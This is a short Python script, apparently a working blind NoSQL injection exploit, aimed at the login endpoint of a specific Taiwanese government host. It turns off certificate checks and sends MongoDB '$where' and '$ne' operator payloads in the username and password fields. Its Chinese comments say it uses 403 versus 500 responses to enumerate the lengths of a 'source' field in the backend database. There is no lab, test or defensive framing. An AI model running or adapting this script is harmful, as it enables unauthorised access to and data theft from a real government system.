import requests, urllib3, time, string
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code
def count_where(e):
    body={"username":{"$where":e},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    return login(body)

print("=== $where 枚举 this.source (403=匹配>=2, 500=<=1) ===")
# 1. source 长度分布
print("source 长度:")
for n in range(3,25):
    sc=count_where(f'this.source!=null && this.source.length=={n}'); time.sleep(0.04)
    print(f"  len=={n:2d} -> {sc} {'<== >=2' if sc==403 else ''}")
